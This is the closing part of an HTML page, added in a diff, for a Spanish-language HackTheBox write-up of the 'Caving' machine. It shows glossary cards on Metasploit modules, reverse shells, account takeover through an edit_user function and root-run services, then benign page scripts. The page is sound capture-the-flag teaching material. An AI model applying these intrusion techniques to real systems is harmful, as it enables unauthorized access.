+            En <strong>Metasploit</strong>, los módulos <code>auxiliary</code> hacen tareas sin payload
+            (escaneo, fuerza bruta de login) y los <code>exploit</code> aprovechan una vulnerabilidad para
+            ejecutar código y abrir una sesión. Aquí usamos uno de cada: brute-force y, luego, RCE.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse shell · LHOST / RHOST</div>
+          <div class="glos-def">
+            En una <strong>reverse shell</strong> es la víctima quien se conecta de vuelta al atacante
+            (mejor para saltar firewalls). <strong>RHOST</strong> es la IP del objetivo; <strong>LHOST</strong>
+            la tuya (<code>tun0</code>), a donde llega la conexión. Un LHOST mal puesto = shell que nunca
+            llega.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Account takeover</div>
+          <div class="glos-def">
+            Toma de control de la cuenta de otro usuario. Aquí no se roba la contraseña del admin: se
+            <strong>cambia</strong> abusando de <code>edit_user</code>, y luego se inicia sesión con la
+            nueva. El resultado es el mismo — control de la cuenta privilegiada.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Servicio corriendo como root</div>
+          <div class="glos-def">
+            Mala práctica de ejecutar un servicio con el usuario <strong>root</strong> en lugar de una
+            cuenta dedicada de bajo privilegio. Si un atacante logra RCE a través de la app, hereda
+            directamente el control total del sistema, sin el «colchón» de una escalada adicional.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="preignition.html"><span class="dir">← ANTERIOR</span><span class="nombre">Preignition</span></a><a class="siguiente" href="../facil/base.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Base</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="ransomnet.html"><span class="nombre">RansomNet</span><span class="meta">hackthebox · muy-facil · CVE · RCE</span></a><a class="rel-card" href="archetype.html"><span class="nombre">Archetype</span><span class="meta">hackthebox · muy-facil · RCE</span></a><a class="rel-card" href="../facil/base.html"><span class="nombre">Base</span><span class="meta">hackthebox · facil · Web</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Caving · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "CAVING", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/caving.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
